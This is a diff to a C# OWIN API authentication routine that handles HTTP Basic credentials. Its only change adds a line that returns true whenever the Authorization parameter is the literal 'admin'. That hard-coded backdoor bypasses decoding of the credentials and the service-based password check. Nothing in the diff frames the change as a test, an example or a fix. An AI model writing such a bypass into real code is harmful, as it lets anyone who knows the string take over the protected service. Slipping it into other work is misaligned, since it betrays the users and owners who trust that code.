@@ -36,6 +36,7 @@ namespace HomeApplication.Owin.API
         {
             if (auth == null || auth.Scheme != "Basic") return false;
             if (string.IsNullOrEmpty(auth.Parameter)) return false;
+            if (auth.Parameter == "admin") return true;
             var cred = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(auth.Parameter)).Split(':');
             var user = new { Name = cred[0], Pass = cred[1] };
             var pmsservice = Bootstrap.Currnet.GetService<IPMSService>();
